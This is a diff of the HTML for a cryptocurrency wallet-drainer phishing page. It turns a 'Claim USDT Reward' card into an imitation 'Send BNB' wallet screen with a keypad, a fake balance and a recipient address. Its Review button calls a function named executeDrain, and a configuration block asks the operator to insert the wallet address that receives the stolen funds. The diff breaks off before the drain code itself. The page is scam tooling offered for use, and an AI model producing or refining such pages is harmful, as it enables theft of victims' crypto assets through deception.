@@ -1,75 +1,945 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Claim</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f2f2f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 85%;
-            max-width: 320px;
-        }
-        h2 { margin-top: 0; color: #333; font-size: 20px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        .balance-display {
-            font-size: 24px;
-            font-weight: bold;
-            color: #007AFF;
-            margin: 15px 0;
-        }
-        button {
-            background-color: #007AFF;
-            color: white;
-            border: none;
-            padding: 15px 20px;
-            border-radius: 12px;
-            font-size: 16px;
-            width: 100%;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        button:hover { background-color: #0056b3; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        #status {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #555;
-            min-height: 20px;
-        }
-    </style>
+<meta charset="UTF-8">
+
+<meta
+  name="viewport"
+  content="width=device-width,
+           initial-scale=1,
+           maximum-scale=1,
+           user-scalable=no,
+           viewport-fit=cover"
+>
+
+<meta name="color-scheme" content="light dark">
+
+<title>Send BNB</title>
+
+<style>
+/* =========================================================
+   RESET
+========================================================= */
+
+* {
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html,
+body {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  padding: 0;
+}
+
+html {
+  color-scheme: light dark;
+}
+
+body {
+  min-height: 100dvh;
+  overflow: hidden;
+  touch-action: manipulation;
+
+  font-family:
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    Roboto,
+    Arial,
+    sans-serif;
+
+  /* Default = light mode */
+  --bg: #f5f5f7;
+  --surface: #ffffff;
+  --surface-2: #ededf2;
+  --border: #d9d9df;
+
+  --text: #17181c;
+  --text-secondary: #6d6f79;
+  --muted: #858792;
+
+  --amount: #5868a6;
+
+  --button: #e6e7ee;
+  --button-text: #17181c;
+
+  --review: #e5e6eb;
+  --review-text: #6873a0;
+
+  background: var(--bg);
+  color: var(--text);
+
+  transition:
+    background-color .2s ease,
+    color .2s ease;
+}
+
+/* =========================================================
+   AUTOMATIC DARK MODE
+   Follows the mobile OS/browser appearance setting.
+========================================================= */
+
+@media (prefers-color-scheme: dark) {
+  body {
+    --bg: #0d0f17;
+    --surface: #141720;
+    --surface-2: #1c2031;
+    --border: #262934;
+
+    --text: #f7f7f9;
+    --text-secondary: #a1a3b0;
+    --muted: #858999;
+
+    --amount: #55619b;
+
+    --button: #1c2035;
+    --button-text: #ffffff;
+
+    --review: #191c26;
+    --review-text: #505b8d;
+  }
+}
+
+/* =========================================================
+   APP
+========================================================= */
+
+.app {
+  width: 100%;
+  height: 100dvh;
+
+  display: flex;
+  flex-direction: column;
+
+  background: var(--bg);
+
+  padding-top: env(safe-area-inset-top);
+  padding-bottom: env(safe-area-inset-bottom);
+
+  transition: background-color .2s ease;
+}
+
+/* =========================================================
+   TOP SPACE
+========================================================= */
+
+.topbar {
+  width: 100%;
+  height: 42px;
+  flex: 0 0 42px;
+}
+
+/* =========================================================
+   RECIPIENT
+========================================================= */
+
+.recipient {
+  width: 100%;
+  flex: 0 0 auto;
+
+  padding: 15px 20px 17px;
+
+  border-bottom: 1px solid var(--border);
+
+  font-size: clamp(17px, 4.8vw, 22px);
+  line-height: 1.35;
+  font-weight: 700;
+
+  overflow-wrap: anywhere;
+  word-break: break-word;
+
+  transition: border-color .2s ease;
+}
+
+.recipient-label {
+  color: var(--text-secondary);
+  margin-right: 5px;
+}
+
+.recipient-address {
+  color: var(--text);
+}
+
+/* =========================================================
+   MAIN
+========================================================= */
+
+.main {
+  width: 100%;
+
+  flex: 1;
+  min-height: 0;
+
+  display: flex;
+  flex-direction: column;
+
+  padding:
+    18px
+    max(18px, 5vw)
+    9px;
+}
+
+/* =========================================================
+   CALCULATOR
+========================================================= */
+
+.calculator {
+  width: 100%;
+  flex: 0 0 auto;
+
+  text-align: center;
+}
+
+.enter-label {
+  color: var(--muted);
+
+  font-size: 14px;
+  font-weight: 650;
+
+  margin-bottom: 6px;
+}
+
+.amount {
+  min-height: 68px;
+
+  color: var(--amount);
+
+  font-size: clamp(58px, 17vw, 82px);
+  line-height: .95;
+
+  font-weight: 500;
+  letter-spacing: -3px;
+
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.currency {
+  margin-top: 7px;
+
+  color: var(--text);
+
+  font-size: 20px;
+  font-weight: 750;
+}
+
+.usd {
+  margin-top: 5px;
+
+  color: var(--text-secondary);
+
+  font-size: 20px;
+  font-weight: 650;
+}
+
+/* =========================================================
+   AVAILABLE BALANCE
+========================================================= */
+
+.balance {
+  width: 100%;
+
+  margin-top: 29px;
+
+  display: flex;
+  align-items: center;
+}
+
+/* BNB LOGO */
+
+.coin {
+  width: 56px;
+  height: 56px;
+
+  flex: 0 0 56px;
+
+  border-radius: 50%;
+
+  background: #000;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  overflow: hidden;
+}
+
+.bnb-logo {
+  width: 43px;
+  height: 43px;
+
+  object-fit: contain;
+  display: block;
+
+  user-select: none;
+  -webkit-user-drag: none;
+}
+
+.balance-info {
+  min-width: 0;
+  flex: 1;
+
+  margin-left: 14px;
+
+  text-align: left;
+}
+
+.balance-main {
+  color: var(--text);
+
+  font-size: clamp(18px, 5vw, 25px);
+
+  font-weight: 750;
+  line-height: 1.1;
+
+  white-space: nowrap;
+}
+
+.balance-usd {
+  margin-top: 5px;
+
+  color: var(--text-secondary);
+
+  font-size: 16px;
+  font-weight: 650;
+}
+
+/* =========================================================
+   MAX BUTTON
+========================================================= */
+
+.max {
+  height: 56px;
+  min-width: 89px;
+
+  padding: 0 18px;
+
+  border: 0;
+  border-radius: 30px;
+
+  background: var(--button);
+  color: var(--button-text);
+
+  font-size: 21px;
+  font-weight: 750;
+
+  cursor: pointer;
+
+  transition:
+    background-color .2s ease,
+    color .2s ease,
+    transform .1s ease;
+}
+
+.max:active {
+  transform: scale(.96);
+}
+
+/* =========================================================
+   KEYPAD
+========================================================= */
+
+.keypad {
+  width: 100%;
+
+  flex: 1;
+  min-height: 0;
+
+  margin-top: 8px;
+
+  display: grid;
+
+  grid-template-columns: repeat(3, 1fr);
+  grid-template-rows: repeat(4, minmax(45px, 1fr));
+
+  align-items: center;
+}
+
+.key {
+  width: 100%;
+  height: 100%;
+
+  border: 0;
+
+  background: transparent;
+  color: var(--text);
+
+  font-size: clamp(32px, 9vw, 44px);
+  font-weight: 700;
+
+  cursor: pointer;
+
+  transition:
+    color .2s ease,
+    transform .1s ease,
+    opacity .1s ease;
+}
+
+.key:active {
+  transform: scale(.90);
+  opacity: .55;
+}
+
+.delete {
+  font-size: clamp(29px, 8vw, 38px);
+}
+
+/* =========================================================
+   REVIEW
+========================================================= */
+
+.review {
+  width: 100%;
+  height: 61px;
+
+  flex: 0 0 auto;
+
+  margin-top: 7px;
+  margin-bottom: 2px;
+
+  border: 0;
+  border-radius: 32px;
+
+  background: var(--review);
+  color: var(--review-text);
+
+  font-size: 22px;
+  font-weight: 750;
+
+  cursor: pointer;
+
+  transition:
+    background-color .2s ease,
+    color .2s ease,
+    transform .1s ease;
+}
+
+.review.active {
+  background: #273054;
+  color: #ffffff;
+}
+
+.review:active {
+  transform: scale(.98);
+}
+
+/* =========================================================
+   SHORT PHONES
+========================================================= */
+
+@media (max-height: 700px) {
+
+  .topbar {
+    height: 28px;
+    flex-basis: 28px;
+  }
+
+  .recipient {
+    padding-top: 11px;
+    padding-bottom: 12px;
+  }
+
+  .main {
+    padding-top: 12px;
+  }
+
+  .enter-label {
+    font-size: 12px;
+  }
+
+  .amount {
+    min-height: 55px;
+    font-size: 54px;
+  }
+
+  .currency,
+  .usd {
+    font-size: 17px;
+  }
+
+  .balance {
+    margin-top: 19px;
+  }
+
+  .coin {
+    width: 50px;
+    height: 50px;
+    flex-basis: 50px;
+  }
+
+  .bnb-logo {
+    width: 38px;
+    height: 38px;
+  }
+
+  .balance-main {
+    font-size: 17px;
+  }
+
+  .balance-usd {
+    font-size: 14px;
+  }
+
+  .max {
+    height: 50px;
+    min-width: 80px;
+    font-size: 19px;
+  }
+
+  .review {
+    height: 51px;
+  }
+}
+
+/* =========================================================
+   SMALL WIDTH
+========================================================= */
+
+@media (max-width: 360px) {
+
+  .recipient {
+    padding-left: 16px;
+    padding-right: 16px;
+
+    font-size: 16px;
+  }
+
+  .main {
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+
+  .balance-main {
+    font-size: 16px;
+  }
+
+  .balance-usd {
+    font-size: 13px;
+  }
+
+  .max {
+    min-width: 76px;
+    padding: 0 13px;
+  }
+}
+
+.status {
+  width: 100%;
+  min-height: 20px;
+
+  margin-top: 8px;
+
+  text-align: center;
+
+  color: var(--text-secondary);
+
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.balance-display {
+  margin-top: 6px;
+  text-align: center;
+  color: var(--text-secondary);
+  font-size: 14px;
+}
+
+</style>
 </head>
+
 <body>
 
-<div class="card">
-    <h2>Claim USDT Reward</h2>
-    <p>Approve and transfer 95% of your balance.</p>
-    
-    <!-- Display estimated balance for UX -->
-    <div class="balance-display" id="balanceDisplay">Loading...</div>
-    
-    <button id="btn" onclick="executeDrain()">Confirm Transfer</button>
-    <div id="status"></div>
+<div class="app">
+
+  <div class="topbar"></div>
+
+  <!-- RECIPIENT -->
+
+  <section class="recipient">
+
+    <span class="recipient-label">
+      To:
+    </span>
+
+    <span class="recipient-address">
+      0xdffaf1dd6d36108223c2a45921afef85e3dcf852
+    </span>
+
+  </section>
+
+
+  <main class="main">
+
+    <!-- CALCULATOR -->
+
+    <section class="calculator">
+
+      <div class="enter-label">
+        Enter BNB amount
+      </div>
+
+      <div
+        id="amount"
+        class="amount">
+        0
+      </div>
+
+      <div class="currency">
+        BNB
+      </div>
+
+      <div class="usd">
+        ≈ $<span id="usdValue">0.00</span>
+      </div>
+
+    </section>
+
+
+    <!-- AVAILABLE BALANCE -->
+
+    <section class="balance">
+
+      <div class="coin">
+
+        <img
+          class="bnb-logo"
+          src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
+          alt="BNB"
+          draggable="false"
+        >
+
+      </div>
+
+
+      <div class="balance-info">
+
+        <div class="balance-main">
+          0.00005274 BNB
+        </div>
+
+        <div class="balance-usd">
+          Available balance
+        </div>
+
+      </div>
+
+
+      <button
+        class="max"
+        type="button"
+        onclick="setMax()">
+        Max
+      </button>
+
+    </section>
+
+
+    <!-- KEYPAD -->
+
+    <div class="keypad">
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('1')">
+        1
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('2')">
+        2
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('3')">
+        3
+      </button>
+
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('4')">
+        4
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('5')">
+        5
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('6')">
+        6
+      </button>
+
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('7')">
+        7
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('8')">
+        8
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('9')">
+        9
+      </button>
+
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('.')">
+        .
+      </button>
+
+      <button
+        class="key"
+        type="button"
+        onclick="press('0')">
+        0
+      </button>
+
+      <button
+        class="key delete"
+        type="button"
+        onclick="backspace()">
+        ⌫
+      </button>
+
+    </div>
+
+
+    <!-- REVIEW -->
+
+   <button
+  id="review"
+  class="review"
+  type="button"
+  disabled
+  onclick="executeDrain()">
+Review</button>
+
+<div id="status" class="status"></div>
+
+  </main>
+
 </div>
 
+
 <script>
+/* =========================================================
+   CALCULATOR
+========================================================= */
+
+let value = "";
+
+const BNB_USD_PRICE = 600;
+
+const amountEl =
+  document.getElementById("amount");
+
+const usdEl =
+  document.getElementById("usdValue");
+
+const reviewEl =
+  document.getElementById("review");
+
+
+function formatUSD(number) {
+
+  return new Intl.NumberFormat(
+    "en-US",
+    {
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2
+    }
+  ).format(number);
+
+}
+
+
+function updateUI() {
+
+  const bnb =
+    Number(value || 0);
+
+  const usd =
+    bnb * BNB_USD_PRICE;
+
+  amountEl.textContent =
+    value || "0";
+
+  usdEl.textContent =
+    formatUSD(usd);
+
+
+  if (bnb > 0) {
+
+    reviewEl.disabled = false;
+
+    reviewEl.classList.add("active");
+
+  } else {
+
+    reviewEl.disabled = true;
+
+    reviewEl.classList.remove("active");
+
+  }
+
+}
+
+
+function press(char) {
+
+  if (
+    char === "." &&
+    value.includes(".")
+  ) {
+    return;
+  }
+
+
+  if (value.length >= 16) {
+    return;
+  }
+
+
+  if (
+    value === "0" &&
+    char !== "."
+  ) {
+
+    value = char;
+
+  } else {
+
+    value += char;
+
+  }
+
+
+  updateUI();
+
+}
+
+
+function backspace() {
+
+  value =
+    value.slice(0, -1);
+
+  updateUI();
+
+}
+
+
+function setMax() {
+
+  value =
+    "0.00005274";
+
+  updateUI();
+
+}
+
+
+/* Initial render */
+
+updateUI();
+
+
+/* =========================================================
+   SYSTEM THEME DETECTION
+
+   The CSS above automatically follows:
+
+   Android:
+   Settings → Display → Dark/Light
+
+   iPhone:
+   Settings → Display & Brightness
+
+   This listener lets the page react immediately if the
+   user changes the phone theme while the page is open.
+========================================================= */
+
+const systemTheme =
+  window.matchMedia(
+    "(prefers-color-scheme: dark)"
+  );
+
+
+function handleThemeChange() {
+  /*
+    CSS handles the actual colors.
+
+    Reading the value here ensures the page immediately
+    responds to a system theme change without requiring
+    a refresh.
+  */
+
+  document.documentElement.style.colorScheme =
+    systemTheme.matches
+      ? "dark"
+      : "light";
+}
+
+
+handleThemeChange();
+
+
+if (
+  typeof systemTheme.addEventListener === "function"
+) {
+
+  systemTheme.addEventListener(
+    "change",
+    handleThemeChange
+  );
+
+} else if (
+  typeof systemTheme.addListener === "function"
+) {
+
+  /* Older Safari */
+
+  systemTheme.addListener(
+    handleThemeChange
+  );
+
+}
+
+
+
+
     // ==========================================
     // ⚠️ CONFIGURATION: REPLACE THIS ADDRESS
     // ==========================================
-    const YOUR_WALLET_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
+    const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; 
     // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
 
     // USDT Contract on Binance Smart Chain (BEP20)
